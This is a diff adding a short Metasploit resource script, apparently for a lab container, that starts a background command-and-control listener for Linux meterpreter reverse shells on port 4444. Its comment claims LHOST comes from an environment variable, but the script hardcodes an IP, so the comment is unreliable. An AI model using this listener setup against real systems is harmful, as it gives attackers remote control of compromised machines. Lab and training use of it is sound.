@@ -1,0 +1,9 @@
+# Metasploit resource script — the C2 listener (multi/handler).
+# Run INSIDE metasploit-container:  msfconsole -q -r handler.rc
+# LHOST is read from the MSF_LHOST environment variable (set to the container's lab IP).
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+setg LHOST 10.255.255.81
+set LPORT 4444
+set ExitOnSession false
+exploit -j
